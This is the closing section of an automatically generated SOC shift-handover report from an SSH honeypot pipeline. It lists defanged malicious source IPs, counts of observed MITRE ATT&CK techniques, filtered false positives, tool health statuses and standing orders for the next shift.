| `120.52.12[.]202` | CN | CHINA UNICOM CLOUD DATA COMPANY LIMITED | **100** ⚠️ | 50 |
| `102.213.34[.]99` | AO | NETSPACE -SERVICOS DE TELECOMUNICACOES, LDA | **100** ⚠️ | 5 |
| `14.103.105[.]243` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 305 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 117 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 117 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 63 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 63 |

---

## 🔕 False Positive Summary (5 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 15 below threshold 25 | 1 |
| AbuseIPDB score 16 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 3 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 311 cases |
| Tool 34  | Credential Extractor        | ✅ 234 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 3 fingerprints |
| Tool 36  | Command Clustering          | ✅ 3 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 36 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 5 filtered (1.6%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 27 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 22 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 117 priority case(s) shown individually · 31 recon entry/entries in table (15 group(s) consolidating 173 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-13T06:13:53Z_
